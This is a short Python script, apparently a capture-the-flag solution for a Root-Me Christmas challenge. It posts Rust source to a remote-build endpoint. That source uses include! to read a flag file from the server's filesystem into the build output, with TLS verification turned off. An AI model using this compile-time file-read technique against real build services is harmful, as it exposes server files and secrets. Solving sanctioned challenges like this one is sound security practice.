import requests

data = { 'src/main.rs' : 'include!("/flag/randomflaglolilolbigbisous.txt");' }

r = requests.post("https://day4.challenges.xmas.root-me.org/remote-build", json=data, verify=False)

print(r.content.decode())
